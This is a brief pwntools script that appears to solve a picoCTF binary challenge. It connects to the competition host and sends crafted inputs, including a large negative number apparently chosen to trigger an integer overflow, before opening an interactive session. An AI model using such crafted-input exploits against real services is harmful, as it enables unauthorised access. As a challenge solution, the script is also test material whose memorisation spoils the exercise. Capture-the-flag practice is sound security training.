import pwn

LOCAL = 0
HOST = "candy-mountain.picoctf.net"
PORT = 49223

elf = pwn.ELF("./system.out")

if LOCAL:
    p = elf.process()
else:
    p = pwn.remote(HOST, PORT)

p.sendline(b"hello")
p.sendline(b"90")
p.sendline(b"-3209081493549540382")
p.interactive()
